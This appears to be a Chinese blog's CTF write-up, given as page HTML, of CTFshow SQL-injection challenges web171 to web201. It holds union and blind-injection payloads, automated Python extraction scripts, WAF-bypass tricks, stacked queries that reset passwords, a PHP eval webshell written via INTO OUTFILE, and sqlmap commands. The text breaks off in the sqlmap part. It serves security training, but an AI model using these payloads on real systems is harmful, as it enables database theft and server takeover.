<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CTFSHOW-SQL注入-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, ctf, Web">
<meta name="description" content="无过滤注入（对输出内容进行过滤）
web171
$sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;
flag是存在于username为flag的用户的数据中，我们只需要通过
1&#39; or 1=1 --&#43;
即可输出所有用户数据
web172
相比上一题，这题增加了过滤">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.2b4603ab7eabc3642d3649f5b8728329d021f06eb40817493eab54c5172e9a52.css" integrity="sha256-K0YDq36rw2QtNkn1uHKDKdAh8G60CBdJPqtUxRcumlI=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="CTFSHOW-SQL注入-Writeup">
  <meta property="og:description" content="无过滤注入（对输出内容进行过滤） web171 $sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;; flag是存在于username为flag的用户的数据中，我们只需要通过
1&#39; or 1=1 --&#43; 即可输出所有用户数据
web172 相比上一题，这题增加了过滤">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-01-22T00:27:55+08:00">
    <meta property="article:modified_time" content="2025-01-22T00:27:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="Ctf">
    <meta property="article:tag" content="Web">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="CTFSHOW-SQL注入-Writeup">
<meta name="twitter:description" content="无过滤注入（对输出内容进行过滤）
web171
$sql = &#34;select username,password from user where username !=&#39;flag&#39; and id = &#39;&#34;.$_GET[&#39;id&#39;].&#34;&#39; limit 1;&#34;;
flag是存在于username为flag的用户的数据中，我们只需要通过
1&#39; or 1=1 --&#43;
即可输出所有用户数据
web172
相比上一题，这题增加了过滤">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CTFSHOW-SQL注入-Writeup",
      "item": "http://localhost:1313/post/ctfshow/ctfshow_sql%E6%B3%A8%E5%85%A5/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CTFSHOW-SQL注入-Writeup",
  "name": "CTFSHOW-SQL注入-Writeup",
  "description": "无过滤注入（对输出内容进行过滤） web171 $sql = \u0026#34;select username,password from user where username !=\u0026#39;flag\u0026#39; and id = \u0026#39;\u0026#34;.$_GET[\u0026#39;id\u0026#39;].\u0026#34;\u0026#39; limit 1;\u0026#34;; flag是存在于username为flag的用户的数据中，我们只需要通过\n1\u0026#39; or 1=1 --+ 即可输出所有用户数据\nweb172 相比上一题，这题增加了过滤\n",
  "keywords": [
    "writeup", "ctf", "Web"
  ],
  "articleBody": "无过滤注入（对输出内容进行过滤） web171 $sql = \"select username,password from user where username !='flag' and id = '\".$_GET['id'].\"' limit 1;\"; flag是存在于username为flag的用户的数据中，我们只需要通过\n1' or 1=1 --+ 即可输出所有用户数据\nweb172 相比上一题，这题增加了过滤\n//检查结果是否有flag\rif($row-\u003eusername!=='flag'){\r$ret['msg']='查询成功';\r} 方法一: 联合查询\n因为联合查询只会显示password\napi/?id=1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23\r/api/?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23\r/api/?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23\r//看到有3列 id,username,password\r/api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23\r//查询password发现没有flag\r//查另一个表 ctfshow_user2\r/api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23\r//看到flag 方法二: 将用户名字段进行编码，绕过检测\n-1' union select to_base64(username),password from ctfshow_user2 --+ 方法三: 只查询密码\n-1' union select id,password from ctfshow_user2 where username='flag web173 过滤要求查询结果中不能出现flag字段\n//检查结果是否有flag\rif(!preg_match('/flag/i', json_encode($ret))){\r$ret['msg']='查询成功';\r} 方法一：联合查询\n和上题解法一样，只是这题flag在ctfshow_user3\n方法二：\n只查询password\n-1' union select id,id,password from ctfshow_user3 where username='flag 方法三: 将用户名字段进行编码，绕过检测\n-1' union select to_base64(username),password from ctfshow_user3 --+ web174 输出时增加了过滤数字\n//检查结果是否有flag和数字\rif(!preg_match('/flag|[0-9]/i', json_encode($ret))){\r$ret['msg']='查询成功';\r} 由于flag中含有数字，哪怕像之前的通过to_base64等编码后，仍然不可避免数字的出现\n所以这题我们要用到布尔盲注\n放个脚本\n1# @Author:Y4tacker 2import requests 3 4url = \"http://e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show/api/v4.php?id=1' and \" 5 6result = '' 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u003c tail: 15 mid = (head + tail) \u003e\u003e 1 16 payload = f'1=if(ascii(substr((select password from ctfshow_user4 limit 24,1),{i},1))\u003e{mid},1,0) -- -' 17 r = requests.get(url + payload) 18 if \"admin\" in r.text: 19 head = mid + 1 20 else: 21 tail = mid 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 又或者通过replace方法将数字替换成其他的合法字符\n1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,'A'),2,'B'),3,'C'),4,'D'),5,'E'),6,'F'),7,'G'),8,'H'),9,'I'),0,'J'),'b' from ctfshow_user4 where username='flag' %23 拿到flag后替换回去就行\n1import base64 2 3flag64 = \"ctfshow{GHIeaIeG-AGaG-DAab-HHae-eEaFcHFIEbef}\" 4 5flag = flag64.replace(\"A\", \"1\").replace(\"B\", \"2\").replace(\"C\", \"3\").replace(\"D\", \"4\").replace(\"E\", \"5\").replace(\"F\", \"6\").replace(\"G\", \"7\").replace(\"H\", \"8\").replace(\"I\", \"9\").replace(\"J\", \"0\") 6 7print(flag) 又或者\n1' union select 1,\"\u003c?=eval($_POST[1]);?\u003e\" into outfile \"/var/www/html/shell.php\" --+ web175 //检查结果是否有flag\rif(!preg_match('/[\\x00-\\x7f]/i', json_encode($ret))){\r$ret['msg']='查询成功';\r}\r检查变量 $ret 经过 json_encode 编码后的结果中是否只包含 ASCII 字符（即字符编码范围在 \\x00 到 \\x7f 之间）。如果不满足这个条件，就将 $ret 数组中的 msg 键的值设置为 '查询成功'。\n也就是没有任何回显\n方法一：时间盲注\n大佬的脚本，用的二分法\n1# @Author:Y4tacker 2import requests 3 4url = \"http://7eac161c-e06e-4d48-baa5-f11edaee7d38.chall.ctf.show/api/v5.php?id=1' and \" 5 6result = '' 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u003c tail: 15 mid = (head + tail) \u003e\u003e 1 16 payload = f'1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),{i},1))\u003e{mid},sleep(2),0) -- -' 17 try: 18 r = requests.get(url + payload, timeout=0.5) 19 tail = mid 20 except Exception as e: 21 head = mid + 1 22 23 if head != 32: 24 result += chr(head) 25 else: 26 break 27 print(result) 方法二:利用读写文件写入网站根目录 http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/api/v5.php?id=1' union select 1,password from ctfshow_user5 into outfile ‘/var/www/html/1.txt’–+\u0026page=1\u0026limit=10 之后访问http://32a74685-8c52-4756-a326-69a2eb56e70f.challenge.ctf.show/1.txt\n过滤注入（对传入参数进行过滤） web176 //对传入的参数进行了过滤\rfunction waf($str){\r//代码过于简单，不宜展示\r} 方法一：万能钥匙\n1' or 1=1--+ 能找到flag\n方法二:大小写绕过\n1' uNion sElect 1,2,password from ctfshow_user --+ web177 黑名单：空格、+\n空格替代：%20（普通空格）、%09（水平制表符）、%0a（换行符）、%0b（回车符）、%0c（新一页）、%0d（垂直制表符）、%a0、()、``、\\**\\\n可以用\\**\\绕过\n1'/**/union/**/select/**/password,1,1/**/from/**/ctfshow_user/**/where/**/username/**/='flag'%23 方法二:万能钥匙\nweb178 黑名单增加：%20、*\n1'%09union%09select%09password,1,1%09from%09ctfshow_user%09where%09username%09='flag'%23 方法二:万能钥匙\nweb179 黑名单增加：%09、%0a、%0b、%0d\n这题把%09也过滤了，这题空格可以用%0c绕过\n1'union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23 web180 黑名单增加：#\n可以用–%0c代替#(%23)\n1'union%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c 或者直接万能密码\nid=-1'or(id=26)and'1'='1 web181 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select/i', $str); 4 } / 和 /i：正则表达式的定界符，/ 表示正则表达式的开始和结束，i 是修饰符，表示不区分大小写进行匹配。\n|\\*：匹配空格字符（）和星号（*），这两个字符在 SQL 注入中可能会被用于构造恶意语句。\n\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0\n：分别匹配不同的 ASCII 控制字符和特殊空白字符，例如：\n\\x09：水平制表符（Tab） \\x0a：换行符（LF） \\x0b：垂直制表符 \\x0c：换页符 \\x00：空字符 \\x0d：回车符（CR） \\xa0：不间断空格 \\x23|\\#：匹配井号（#），在 SQL 中，# 通常用于注释，攻击者可能会利用注释来绕过 SQL 语句的检查。\nfile|into|select：匹配关键字 file、into 和 select，这些关键字在 SQL 注入和文件包含攻击中经常被使用。\n方法一 用like来匹配关键词flag\n-1'%0cor%0cusername%0clike%0c'flag 方法二\n-1'or(id=26)and'1 看到一篇大佬的文章，感觉明了不少\nctfshow Web入门SQL注入 web171-197 Writeup - X1r0z Blog\nweb182 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x00|\\x0d|\\xa0|\\x23|\\#|file|into|select|flag/i', $str); 4 } 黑名单增加：flag\n这题可以用到like进行模糊查询\npayload:\n-1'or%0cusername%0clike%0c'fl% 或者继续使用上一题的方法二\nweb183 查询语句\n//拼接sql语句查找指定ID用户\r$sql = \"select count(pass) from \".$_POST['tableName'].\";\"; 返回逻辑\n//对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i', $str);\r} 查询结果\n//返回用户表的记录总数\r$user_count = 0; 题目大概的意思就是我们传入表名进行查询，如果表名正确，就会返回用户表记录总数1，如果表名错误则返回0，且每次最多只会返回1，根据这个我们可以尝试布尔盲注，如果我们知道表名(ctfshow_user)和列名(pass)，我们就能通过布尔盲注拿到flag\nY4tacker大佬的脚本\nimport requests\rurl = 'http://ee0ad3ab-e8f0-4183-97a8-aa3c5bcbe4f4.challenge.ctf.show/select-waf.php'\rstr = r\"{abcdefghijklmnopqrstuvwsyz-0123456789}\"\rflag = \"\"\rindex = 0\rwhile True:\rfor i in str:\rdata = {\r'tableName': f\"(ctfshow_user)where(substr(pass,{index},1))regexp('{i}')\"\r}\rr = requests.post(url, data=data)\rif r.text.find(\"$user_count = 1;\") \u003e 0:\rflag += i\rprint(flag)\rbreak\rindex += 1 不是为什么我flag的马甲是这样的\nweb184 1//对传入的参数进行了过滤 2 function waf($str){ 3 return preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i', $str); 4 } 因为这题where被ban了，我们可以利用right join进行代替\n依旧是布尔盲注\nPOC\nimport requests\rurl = 'http://effed757-6639-46a9-9103-22fedb04bb41.challenge.ctf.show/select-waf.php'\rcharset = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}'\rflag = ''\rfor i in range(1, 50): # 假设 flag 最长 50 个字符\rfor j in charset:\rpayload = f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{i},1) regexp char({ord(j)}))\"\rdata = {\r'tableName': payload\r}\rresponse = requests.post(url, data=data)\rif \"some_success_condition\" in response.text:\rflag += j\rprint(flag)\rbreak web185 //对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i', $str);\r} 这题把数字ban掉了\n这其实就导致了我们在构造payload的时候没办法直接使用数字\n但是我们可以用true来代替构造出数字\n我们知道true = 1\n那2就可以用true+true来表示，以此类推\n1import requests 2url = \"http://33578c7b-f34a-422b-87a5-a8accac68645.challenge.ctf.show/select-waf.php\" 3flag = '' 4 5 6def createNum(n): 7 num = 'true' 8 if n == 1: 9 return 'true' 10 else: 11 for i in range(n - 1): 12 num += \"+true\" 13 return num 14 15 16for i in range(45): 17 if i \u003c= 5: 18 continue 19 for j in range(127): 20 data = { 21 \"tableName\": f\"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,{createNum(i)},{createNum(1)})regexp(char({createNum(j)})))\" 22 } 23 r = requests.post(url, data=data) 24 if r.text.find(\"$user_count = 43;\") \u003e 0: 25 if chr(j) != \".\": 26 flag += chr(j) 27 28 print(\"[*]result is:\"+flag.lower()) 29 if chr(j) == \"}\": 30 exit(0) 31 break web186 //对传入的参数进行了过滤\rfunction waf($str){\rreturn preg_match('/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\\u003c|\\\u003e|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\'|\\\"|union|\\`|sleep|benchmark/i', $str);\r} 解法和上题一样\nweb187 返回逻辑\r$username = $_POST['username'];\r$password = md5($_POST['password'],true);\r//只有admin可以获得flag\rif($username!='admin'){\r$ret['msg']='用户名不存在';\rdie(json_encode($ret));\r}\rpassword=md5($pass,true)绕过、弱类型、MD5强碰撞_select * from ‘admin’ where password=md5($pass,tru-CSDN博客\npayload:\nadmin/ffifdyop 抓个包\nweb188 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \"select pass from ctfshow_user where username = {$username}\"; 返回逻辑\r//用户名检测\rif(preg_match('/and|or|select|from|where|union|join|sleep|benchmark|,|\\(|\\)|\\'|\\\"/i', $username)){\r$ret['msg']='用户名非法';\rdie(json_encode($ret));\r}\r//密码检测\rif(!is_numeric($password)){\r$ret['msg']='密码只能为数字';\rdie(json_encode($ret));\r}\r//密码判断\rif($row['pass']==intval($password)){\r$ret['msg']='登陆成功';\rarray_push($ret['data'], array('flag'=\u003e$flag));\r}\rctfshow-sql注入-超详解(172-200)_ctfshow 172-CSDN博客\n所以payload为\n0/0\r或者\r1||1/0 https://stackoverflow.com/questions/18883213/why-select-from-table-where-username-0-shows-all-rows-username-column-is-v\nweb189 //拼接sql语句查找指定ID用户\r$sql = \"select pass from ctfshow_user where username = {$username}\"; //用户名检测\rif(preg_match('/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i', $username)){\r$ret['msg']='用户名非法';\rdie(json_encode($ret));\r}\r//密码检测\rif(!is_numeric($password)){\r$ret['msg']='密码只能为数字';\rdie(json_encode($ret));\r}\r//密码判断\rif($row['pass']==$password){\r$ret['msg']='登陆成功';\r}\r这题在输入0/0的时候会显示密码错误，而在输入1/0的时候则会显示查询错误\n可以通过这个来进行布尔盲注，即正确时系统返回查询错误，错误时系统返回密码错误\n1# -*- coding: utf-8 -*- 2# @Author : Yn8rt 3# @Time : 2021/7/30 15:48 4# @Function: 5import requests 6import sys 7import json 8 9url = 'http://98e1809d-5de9-4f68-b45f-d03388b1dae8.challenge.ctf.show/api/' 10flag = 'ctfshow{' 11letter = '0123456789abcdefghijklmnopqrstuvwxyz-{}' 12 13for i in range(100): 14 for j in letter: 15 payload = { 16 \"username\": \"if(load_file('/var/www/html/api/index.php')regexp('{}'),0,1)\".format(flag + j), 17 \"password\": \"0\" 18 19 } 20 r = requests.post(url=url,data=payload) 21 #print(r) 22 if \"密码错误\" == r.json()['msg']: 23 flag += j 24 print(flag) 25 break 26 if '}' in flag: 27 sys.exit() web190 查询语句\n//拼接sql语句查找指定ID用户\r$sql = \"select pass from ctfshow_user where username = '{$username}'\";\r返回逻辑\n//密码检测\rif(!is_numeric($password)){\r$ret['msg']='密码只能为数字';\rdie(json_encode($ret));\r}\r//密码判断\rif($row['pass']==$password){\r$ret['msg']='登陆成功';\r}\r//TODO:感觉少了个啥，奇怪\r所以这题依旧可以进行布尔盲注\n1# @Author:Y4tacker 2import requests 3 4url = \"http://eb2e57dd-6c44-4140-9052-f549f647caa9.challenge.ctf.show/api/\" 5 6result = \"\" 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u003c tail: 15 mid = (head + tail) \u003e\u003e 1 16 # 查数据库 17 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 18 # 查字段 19 # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'\" 20 # 查flag 21 payload = \"select group_concat(f1ag) from ctfshow_fl0g\" 22 data = { 23 'username': f\"admin' and if(ascii(substr(({payload}),{i},1))\u003e{mid},1,2)='1\", 24 'password': '1' 25 } 26 27 r = requests.post(url,data=data) 28 if \"密码错误\" == r.json()['msg']: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web191 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \"select pass from ctfshow_user where username = '{$username}'\"; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret['msg']='密码只能为数字'; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row['pass']==$password){ 16 $ret['msg']='登陆成功'; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match('/file|into|ascii/i', $username)){ 21 $ret['msg']='用户名非法'; 22 die(json_encode($ret)); 23 } 这题和上题一样，只是加了点ban掉了ascii\n我们用ord代替ascii即可\n1# @Author:Y4tacker 2import requests 3 4url = \"http://92a52ee7-65ff-4fff-b3d9-ec90f74fd2f5.challenge.ctf.show/api/\" 5 6result = \"\" 7i = 0 8 9while True: 10 i = i + 1 11 head = 32 12 tail = 127 13 14 while head \u003c tail: 15 mid = (head + tail) \u003e\u003e 1 16 # 查数据库 17 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 18 # 查字段 19 # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'\" 20 # 查flag 21 payload = \"select group_concat(f1ag) from ctfshow_fl0g\" 22 data = { 23 'username': f\"admin' and if(ord(substr(({payload}),{i},1))\u003e{mid},1,2)='1\", 24 'password': '1' 25 } 26 27 r = requests.post(url,data=data) 28 if \"密码错误\" == r.json()['msg']: 29 head = mid + 1 30 else: 31 tail = mid 32 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web192 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \"select pass from ctfshow_user where username = '{$username}'\"; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret['msg']='密码只能为数字'; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row['pass']==$password){ 16 $ret['msg']='登陆成功'; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match('/file|into|ascii|ord|hex/i', $username)){ 21 $ret['msg']='用户名非法'; 22 die(json_encode($ret)); 23 } 不给我转是吧，那我不转了\n1import requests 2import string 3 4url = \"http://20b20943-6b5a-464b-b13e-99ab8e2644b7.challenge.ctf.show/api/\" 5flagstr=\" _{}-\" + string.ascii_lowercase + string.digits 6flag = '' 7for i in range(1,45): 8 for j in flagstr: 9 payload = f\"admin' and if(substr((select group_concat(f1ag) from ctfshow_fl0g),{i},1)regexp('{j}'),1,2)='1\" 10 data = { 11 'username': payload, 12 'password': '1' 13 } 14 r = requests.post(url, data=data) 15 if \"密码错误\" == r.json()['msg']: 16 flag += j 17 print(flag) 18 if \"}\" in flag: 19 exit(0) 20 break 其实也差不多\n二分法脚本\n1 2# 用了二分法 dejavu~~~ 3import requests 4 5url = \"http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/\" 6# 表名 CtFsHOw{FL0G,CtFsHOw{usEr 7# payload = \"0' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)\u003e'{}',1,0) -- \" 8# 列名 ID,F1AG,ID,usErNAME,pAss 9# payload = \"0' or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)\u003e'{}',1,0) -- \" 10# flag 11payload = \"0' or if(substr((select f1ag from ctfshow_fl0g),{},1)\u003e'{}',1,0) -- \" 12true_flag = \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" 13result = \"\" 14index = 1 15while True: 16 start = 32 17 end = 127 18 while not (abs(start-end) == 1 or start == end): 19 p = (start + end) // 2 20 data = { 21 \"username\": payload.format(index, chr(p)), 22 \"password\": 0 23 } 24 response = None 25 while True: 26 try: 27 response = requests.post(url, data=data) 28 except: 29 continue 30 break 31 if true_flag in response.text: 32 start = p 33 else: 34 end = p 35 if end \u003c start: 36 end = start 37 result += chr(end) 38 print(f\"[*] result: {result}\") 39 index += 1 web193 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \"select pass from ctfshow_user where username = '{$username}'\"; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret['msg']='密码只能为数字'; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row['pass']==$password){ 16 $ret['msg']='登陆成功'; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match('/file|into|ascii|ord|hex|substr/i', $username)){ 21 $ret['msg']='用户名非法'; 22 die(json_encode($ret)); 23 } 新增waf：substr\n没办法进行截断，但其实问题不大\n1import requests 2import sys 3url = 'http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/' 4result = '' 5letter = '0123456789abcdefghijklmnopqrstuvwxyz-_,{}' 6 7for i in range(100): 8 for j in letter: 9 # 查表 10 # payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\" 11 # 查字段 12 # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'\" 13 # 查flag 14 payload = \"select group_concat(f1ag) from ctfshow_flxg\" 15 16 data={ 17 'username':\"admin' and if(({}) like '{}%',1,2) ='1\".format(payload,result+j), 18 'password':1 19 } 20 res = requests.post(url=url,data=data) 21 if \"密码错误\" == res.json()['msg']: 22 result += j 23 print(result) 24 break 25 if \"}\" in result: 26 exit(0) 我们可以用like来达到差不多的效果\n这题也可以用char,left,right,substring之类的方法\nweb194 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \"select pass from ctfshow_user where username = '{$username}'\"; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret['msg']='密码只能为数字'; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row['pass']==$password){ 16 $ret['msg']='登陆成功'; 17 } 18 19 //TODO:感觉少了个啥，奇怪 20 if(preg_match('/file|into|ascii|ord|hex|substr|char|left|right|substring/i', $username)){ 21 $ret['msg']='用户名非法'; 22 die(json_encode($ret)); 23 } 新增waf：char|left|right|substring\n上题的方法依旧适用\nweb195 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \"select pass from ctfshow_user where username = {$username};\"; 5 6返回逻辑 7 8 //密码检测 9 if(!is_numeric($password)){ 10 $ret['msg']='密码只能为数字'; 11 die(json_encode($ret)); 12 } 13 14 //密码判断 15 if($row['pass']==$password){ 16 $ret['msg']='登陆成功'; 17 } 18 19 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 20 if(preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\'|\\\"|select|union|or|and|\\x26|\\x7c|file|into/i', $username)){ 21 $ret['msg']='用户名非法'; 22 die(json_encode($ret)); 23 } 24 25 if($row[0]==$password){ 26 $ret['msg']=\"登陆成功 flag is $flag\"; 27 } 根据提示堆叠注入\n其实就是在;后面再执行任意的sql命令\n这里直接改密码\npayload=\"0x61646d696e;update`ctfshow_user`set`pass`=0x313131;\"\r# 至于为什么非得用十六进制登录，是因为下面这个没有字符串单引号包围\rsql = \"select pass from ctfshow_user where username = {$username};\";\r# @Author:Y4tacker admin \u003c=\u003e 0x61646d696e\r111\u003c=\u003e0x313131 web196 查询语句\r//拼接sql语句查找指定ID用户\r$sql = \"select pass from ctfshow_user where username = {$username};\";\r返回逻辑\r//TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧\rif(preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\'|\\\"|select|union|or|and|\\x26|\\x7c|file|into/i', $username)){\r$ret['msg']='用户名非法';\rdie(json_encode($ret));\r}\rif(strlen($username)\u003e16){\r$ret['msg']='用户名不能超过16个字符';\rdie(json_encode($ret));\r}\rif($row[0]==$password){\r$ret['msg']=\"登陆成功 flag is $flag\";\r}\r这题应该是bug了，select没被waf\n在 PHP 里，当使用数据库查询语句从数据库中获取结果集时，通常会逐行遍历结果集。每一行数据可以用一个数组来表示，$row[0] 指的是这一行数组中的第一个元素。\npayload:\n0;select(2)\r2 web197 1查询语句 2 3 //拼接sql语句查找指定ID用户 4 $sql = \"select pass from ctfshow_user where username = {$username};\"; 5 6返回逻辑 7 8 9 //TODO:感觉少了个啥，奇怪,不会又双叒叕被一血了吧 10 if('/\\*|\\#|\\-|\\x23|\\'|\\\"|union|or|and|\\x26|\\x7c|file|into|select|update|set//i', $username)){ 11 $ret['msg']='用户名非法'; 12 die(json_encode($ret)); 13 } 14 15 if($row[0]==$password){ 16 $ret['msg']=\"登陆成功 flag is $flag\"; 17 } 18 这把不能用select，那我们只需要想办法给$row[0]一个确定的值即可\n比如\nusername: 1;show tables password: ctfshow_user 其他的一些骚操作\n重写ctfshow_user表\n把密码和id列互换之后爆密码（实际上在爆id）\n1# @Author:Y4tacker 2import requests 3 4url = \"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/\" 5for i in range(100): 6 if i == 0: 7 data = { 8 'username': '0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user ' 9 'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` ' 10 'varchar(255);', 11 'password': f'{i}' 12 } 13 r = requests.post(url, data=data) 14 data = { 15 'username': '0x61646d696e', 16 'password': f'{i}' 17 } 18 r = requests.post(url, data=data) 19 if \"登陆成功\" in r.json()['msg']: 20 print(r.json()['msg']) 21 break web198 同web197\nweb199 通解一把梭\nweb200 通解一把梭\nweb190-web200通解 username=0;show tables;\rpass=ctfshow_user sqlmap的使用 web201 sqlmap最新版下载\r使用--user-agent 指定agent\r使用--referer 绕过referer检查 检测注入类型\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/sqlmap.php/api/?id= --user-agent sqlmap --referer ctf.show\r爆数据库\rpython sqlmap.py -u http://6583b09f-115c-4262-8c47-df0a033b1926.challenge.ctf.show/api/?id= 